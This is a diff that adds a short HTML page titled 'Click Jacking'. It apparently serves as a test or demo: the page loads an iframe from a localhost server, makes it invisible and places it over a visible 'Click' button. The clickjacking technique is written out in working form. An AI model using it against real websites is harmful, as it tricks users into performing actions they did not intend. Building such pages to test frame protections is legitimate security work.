@@ -1,0 +1,30 @@
+<!doctype html>
+<html id="html">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Click Jacking</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      #frame {
+        width: 500px;
+        height: 500px;
+        position: absolute;
+        left: -10px;
+        top: -148px;
+        opacity: 0;
+      }
+    </style>
+  </head>
+  <body id="body">
+    <button type="button">Click</button>
+  
+    <script>
+      var contextName = location.search.replace('?', '');
+      var iframe = document.createElement('iframe');
+      iframe.src = 'https://localhost:8443/' + contextName + '/click-jacking';
+      iframe.id = 'frame';
+      
+      document.getElementById('body').appendChild(iframe);
+    </script>
+  </body>
+</html>
